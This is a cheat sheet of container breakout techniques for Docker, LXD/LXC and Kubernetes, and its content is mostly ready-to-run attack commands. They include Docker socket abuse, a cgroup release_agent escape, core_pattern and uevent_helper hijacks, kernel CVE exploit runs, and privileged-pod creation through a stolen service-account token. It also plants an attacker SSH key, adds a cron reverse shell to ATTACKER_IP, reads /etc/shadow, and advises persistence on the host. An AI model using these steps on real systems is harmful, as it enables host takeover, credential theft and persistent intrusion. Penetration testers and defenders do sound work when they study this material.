# Container Escape (Container Breakout Techniques)

> For authorized security testing, CTF competitions, and educational purposes only.

Container escape techniques exploit misconfigurations, excessive privileges, and kernel
vulnerabilities to break out of container isolation and gain access to the host system.
This covers Docker, LXD/LXC, and Kubernetes pod escapes, including cgroup abuse,
namespace confusion, capability misuse, and runtime vulnerabilities.

---

## Enumeration and Detection

### Detecting Container Environment

```bash
# Am I in a container?
cat /proc/1/cgroup 2>/dev/null | grep -qE 'docker|lxc|kubepods' && echo "Container detected"

# Check for .dockerenv
ls -la /.dockerenv 2>/dev/null && echo "Docker container"

# Check for container runtime
cat /proc/1/environ 2>/dev/null | tr '\0' '\n' | grep -i container

# Check hostname (often random hex in Docker)
hostname

# Check for reduced capabilities
cat /proc/self/status | grep -i cap
capsh --print 2>/dev/null

# Check seccomp status
cat /proc/self/status | grep Seccomp
# 0 = disabled, 1 = strict, 2 = filter

# Check mount namespace
ls -la /proc/1/ns/mnt
mount | head -20

# Check for Kubernetes
ls /var/run/secrets/kubernetes.io/serviceaccount/ 2>/dev/null
env | grep -i kubernetes

# Container runtime detection
cat /proc/1/cgroup | head -5
# docker: /docker/<container_id>
# k8s: /kubepods/burstable/pod<id>/<container_id>
# lxc: /lxc/<container_name>
```

### Privileged Container Detection

```bash
# Check if running as privileged
cat /proc/self/status | grep CapEff
# CapEff: 0000003fffffffff = fully privileged (all caps)
# CapEff: 00000000a80425fb = default Docker caps

# Decode capabilities
capsh --decode=0000003fffffffff

# Check for sensitive mounts
mount | grep -E '/dev/sd|/dev/vd|/dev/nvme'  # host disks
mount | grep -E 'proc|sys|cgroup'             # sensitive pseudo-fs
ls -la /dev/sda* 2>/dev/null                  # raw disk access

# Check for Docker socket
ls -la /var/run/docker.sock 2>/dev/null
ls -la /run/docker.sock 2>/dev/null

# Check AppArmor / SELinux
cat /proc/self/attr/current 2>/dev/null       # AppArmor profile
getenforce 2>/dev/null                         # SELinux mode

# Network namespace check
ip link show                                   # network interfaces
cat /proc/net/route                            # routing table
# Host network = many interfaces; isolated = just eth0+lo
```

---

## Docker Socket Escape

### Mounted Docker Socket

```bash
# If /var/run/docker.sock is mounted inside the container,
# you have full control of the Docker daemon (equivalent to root on host)

# Verify socket access
ls -la /var/run/docker.sock
curl -s --unix-socket /var/run/docker.sock http://localhost/version

# List host containers
curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json | python3 -m json.tool

# Create privileged container with host filesystem mounted
curl -s --unix-socket /var/run/docker.sock \
  -X POST -H "Content-Type: application/json" \
  -d '{"Image":"alpine","Cmd":["sh"],"Binds":["/:/host"],"Privileged":true}' \
  http://localhost/containers/create

# Or use docker CLI if available
docker -H unix:///var/run/docker.sock run -v /:/host -it --privileged alpine sh
# Now access host filesystem at /host
cat /host/etc/shadow
chroot /host

# Write SSH key for persistence
mkdir -p /host/root/.ssh
echo "ssh-ed25519 AAAA... attacker@host" >> /host/root/.ssh/authorized_keys
chmod 600 /host/root/.ssh/authorized_keys

# Schedule reverse shell via host cron
echo "* * * * * root bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" \
  >> /host/etc/crontab
```

---

## Privileged Container Abuse

### Direct Host Access

```bash
# Privileged containers have ALL capabilities and can see host devices

# Mount host filesystem via device
fdisk -l                    # find host disk (e.g., /dev/sda1)
mkdir -p /mnt/host
mount /dev/sda1 /mnt/host   # mount host root partition
ls /mnt/host/etc/shadow     # read host files

# Load kernel module (requires CAP_SYS_MODULE)
# Compile a kernel module that creates a reverse shell
insmod /path/to/rootkit.ko

# Access host /proc
mount -t proc proc /proc_host
ls /proc_host/1/root/       # host PID 1 filesystem root

# Write to host kernel parameters
echo 1 > /proc/sys/kernel/core_pattern     # modify core dump handler
echo "|/path/to/exploit" > /proc/sys/kernel/core_pattern

# nsenter — enter host namespaces from privileged container
nsenter --target 1 --mount --uts --ipc --net --pid -- /bin/bash
# This drops you into the host namespace as root
```

### Cgroup Escape (release_agent)

```bash
# Classic cgroup v1 escape — requires CAP_SYS_ADMIN
# This writes a payload to the cgroup release_agent which executes on the host

# Step 1: Create a cgroup and enable notify_on_release
d=$(dirname $(ls -x /s*/fs/c*/*/r* | head -n1))
mkdir -p $d/exploit_cgroup

# Step 2: Set release_agent to our payload
echo 1 > $d/exploit_cgroup/notify_on_release

# Step 3: Find host path for container overlay
host_path=$(sed -n 's/.*\upperdir=\([^,]*\).*/\1/p' /etc/mtab)

# Step 4: Write exploit script
cat > /cmd << 'EXPLOIT'
#!/bin/sh
cat /etc/shadow > /output
EXPLOIT
chmod +x /cmd

# Step 5: Set release_agent to host path of our script
echo "$host_path/cmd" > $d/release_agent

# Step 6: Trigger — create and immediately remove a process in the cgroup
sh -c "echo \$\$ > $d/exploit_cgroup/cgroup.procs" &
sleep 1

# Step 7: Read output
cat /output
```

---

## Capability Abuse

### CAP_SYS_ADMIN

```bash
# CAP_SYS_ADMIN is nearly equivalent to root — enables:
# - mount/umount filesystems
# - Modify cgroups
# - Set hostname, domainname
# - Use pivot_root
# - Various ioctl operations

# Mount host filesystems
mount -t proc proc /mnt
mount /dev/sda1 /mnt

# Cgroup release_agent escape (see above)

# Abuse of unshare
unshare -m -p --fork -- /bin/bash
# New mount namespace with mount privileges
```

### CAP_SYS_PTRACE

```bash
# CAP_SYS_PTRACE allows debugging any process (including host processes)

# Find a host process (if PID namespace is shared)
ps aux | grep root

# Inject code into host process via ptrace
# Use a process injector (e.g., linux-inject)
./inject -p <host_pid> /path/to/payload.so

# Or use /proc/<pid>/mem to write shellcode
# Python script:
import ctypes
# Open /proc/<target_pid>/mem, seek to code section, overwrite with shellcode
# (simplified — full exploit requires ELF parsing and RIP-relative addressing)

# Process information disclosure
cat /proc/<host_pid>/maps        # memory layout
cat /proc/<host_pid>/environ     # environment variables (may contain secrets)
cat /proc/<host_pid>/cmdline     # command line arguments
```

### CAP_NET_ADMIN

```bash
# CAP_NET_ADMIN allows network configuration changes

# ARP spoofing from container
arpspoof -i eth0 -t <gateway_ip> <target_ip>

# Packet capture
tcpdump -i eth0 -w /tmp/capture.pcap

# Create network tunnels
ip tunnel add tun0 mode ipip remote <attacker_ip> local <container_ip>
ip link set tun0 up
ip addr add 10.10.10.1/24 dev tun0

# Modify iptables (if available)
iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 8080
```

### CAP_DAC_READ_SEARCH

```bash
# Bypass file read permission checks — read any file in the filesystem

# If the container shares a filesystem with the host:
# Read /etc/shadow directly regardless of permissions
cat /etc/shadow

# Use open_by_handle_at to access files across mount boundaries
# shocker exploit — https://github.com/gabber12/shocker
python3 shocker.py /etc/shadow
# This syscall bypasses container mount namespace isolation
```

---

## /proc and /sys Abuse

### Sensitive Procfs Entries

```bash
# Host kernel information
cat /proc/version              # kernel version (find matching exploits)
cat /proc/cmdline              # kernel boot parameters
cat /proc/config.gz 2>/dev/null | zcat  # kernel config

# Modify core_pattern for code execution
# (requires write access to /proc/sys/)
echo "|/path/to/exploit %p" > /proc/sys/kernel/core_pattern
# Trigger a core dump in a setuid binary -> exploit runs as root

# kptr_restrict bypass
cat /proc/kallsyms             # kernel symbol addresses (if readable)

# Host network information
cat /proc/net/arp              # ARP cache (discover hosts)
cat /proc/net/tcp              # TCP connections (hex encoded)
cat /proc/net/route            # routing table
```

### Sysfs Exploitation

```bash
# /sys/fs/cgroup — cgroup filesystem (see release_agent escape above)

# /sys/kernel/uevent_helper
# If writable, set to a payload script — called on every uevent
echo "/path/to/payload" > /sys/kernel/uevent_helper
# Trigger uevent:
echo change > /sys/class/mem/null/uevent

# /sys/class/bdi — backing device info
# May reveal host filesystem structure

# /sys/firmware/efi/vars — EFI variables
# Can modify boot configuration on UEFI systems
```

---

## Kernel Exploits from Containers

### Container-Relevant CVEs

```bash
# Dirty COW (CVE-2016-5195) — race condition in copy-on-write
# Affects: Linux < 4.8.3
# Escapes container by writing to read-only mapped files
gcc -pthread dirty_cow.c -o dirty_cow -lcrypt
./dirty_cow /etc/passwd

# OverlayFS exploits (CVE-2021-3493, CVE-2023-0386)
# Affects: Ubuntu kernels with unprivileged overlayfs
# Exploits privilege handling in overlay filesystem
gcc exploit.c -o exploit
./exploit  # gains root in container -> potentially escape

# Dirty Pipe (CVE-2022-0847) — splice pipe overwrite
# Affects: Linux 5.8 - 5.16.11
gcc dirty_pipe.c -o dirty_pipe
./dirty_pipe /etc/passwd 1 "${openssl_hash}"

# nf_tables (CVE-2022-32250) — use-after-free in netfilter
# Requires CAP_NET_ADMIN (common in some container configs)

# Check kernel version for known vulnerabilities
uname -r
# Compare against exploit databases:
# - https://www.exploit-db.com/
# - searchsploit linux kernel
```

---

## runc Vulnerabilities

### CVE-2019-5736 (runc Escape)

```bash
# Overwrites host runc binary via /proc/self/exe
# Affects: runc < 1.0-rc6 (Docker < 18.09.2)

# Attack: malicious container overwrites host runc binary
# When next container is started with docker exec, payload runs on host

# Proof of concept (simplified):
# 1. Container replaces /bin/sh with script that opens /proc/self/exe
# 2. When docker exec runs, it uses runc which enters container
# 3. Container's /bin/sh follows /proc/self/exe -> host runc binary
# 4. Writes payload over host runc binary
# 5. Next docker exec invocation runs attacker's payload as root

# Check runc version
runc --version
docker info | grep -i runc

# CVE-2024-21626 (Leaky Vessels)
# Affects: runc < 1.1.12
# Working directory set to /proc/self/fd/<N> leaks host filesystem
# Process.cwd is resolved before chroot, allowing path traversal
```

---

## LXD/LXC Escape

### LXD Group Privilege Escalation

```bash
# If user is in the 'lxd' group, can escalate to root on the host

# Step 1: Import a minimal image
lxc image import ./alpine.tar.gz --alias alpine_escape

# Step 2: Create container with host root mounted
lxc init alpine_escape escape_container -c security.privileged=true
lxc config device add escape_container host_root disk source=/ path=/mnt/host recursive=true

# Step 3: Start and enter
lxc start escape_container
lxc exec escape_container -- /bin/sh

# Step 4: Access host filesystem
cat /mnt/host/etc/shadow
chroot /mnt/host /bin/bash

# Alternative: build image from scratch
# Create minimal rootfs, tar it up, import as image
```

---

## Kubernetes Pod Escapes

### Service Account Token Abuse

```bash
# Default service account token location
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
CACERT=/var/run/secrets/kubernetes.io/serviceaccount/ca.crt
NAMESPACE=$(cat /var/run/secrets/kubernetes.io/serviceaccount/namespace)

# Query API server
APISERVER=https://kubernetes.default.svc
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods

# Check permissions
curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  $APISERVER/apis/authorization.k8s.io/v1/selfsubjectrulesreviews \
  -X POST -H "Content-Type: application/json" \
  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"'$NAMESPACE'"}}'

# If can create pods — create privileged pod
cat << 'EOF' | curl -s --cacert $CACERT -H "Authorization: Bearer $TOKEN" \
  -X POST -H "Content-Type: application/json" \
  $APISERVER/api/v1/namespaces/$NAMESPACE/pods -d @-
{
  "apiVersion": "v1",
  "kind": "Pod",
  "metadata": {"name": "escape-pod"},
  "spec": {
    "containers": [{
      "name": "escape",
      "image": "alpine",
      "command": ["sh", "-c", "sleep 3600"],
      "securityContext": {"privileged": true},
      "volumeMounts": [{"name": "host", "mountPath": "/host"}]
    }],
    "volumes": [{"name": "host", "hostPath": {"path": "/"}}]
  }
}
EOF
```

### Kubelet API Abuse

```bash
# Kubelet API (port 10250) — if exposed without auth
curl -sk https://<node_ip>:10250/pods

# Execute commands via kubelet
curl -sk https://<node_ip>:10250/run/<namespace>/<pod>/<container> \
  -X POST -d "cmd=id"

# List all containers on node
curl -sk https://<node_ip>:10250/runningpods/
```

---

## Tips

- Always check for the Docker socket first — it is the most common and easiest container escape vector
- Verify capabilities with `capsh --print` before attempting capability-dependent exploits to avoid wasting time
- The `nsenter` command with `--target 1` is the fastest escape from a privileged container to a host shell
- When exploiting cgroup release_agent, the host path to the container filesystem is found in /etc/mtab or /proc/mounts
- Check /proc/self/status CapEff field: `3fffffffff` means privileged, anything less means restricted
- Kernel exploits work from containers because containers share the host kernel — always check `uname -r`
- In Kubernetes, enumerate service account permissions before attempting API-based escapes
- Container escapes often require combining multiple small misconfigurations rather than a single critical flaw
- Test escape techniques in lab environments first; production container escapes risk crashing the host
- After escaping, establish persistence on the host rather than relying on the container continuing to run

---

## See Also

- container-security
- seccomp
- capabilities
- apparmor

## References

- [Docker Security Documentation](https://docs.docker.com/engine/security/)
- [CIS Docker Benchmark](https://www.cisecurity.org/benchmark/docker)
- [HackTricks Container Escapes](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-security)
- [CVE-2019-5736 — runc Container Escape](https://nvd.nist.gov/vuln/detail/CVE-2019-5736)
- [Trail of Bits — Understanding Docker Container Escapes](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [Kubernetes Security Best Practices](https://kubernetes.io/docs/concepts/security/)
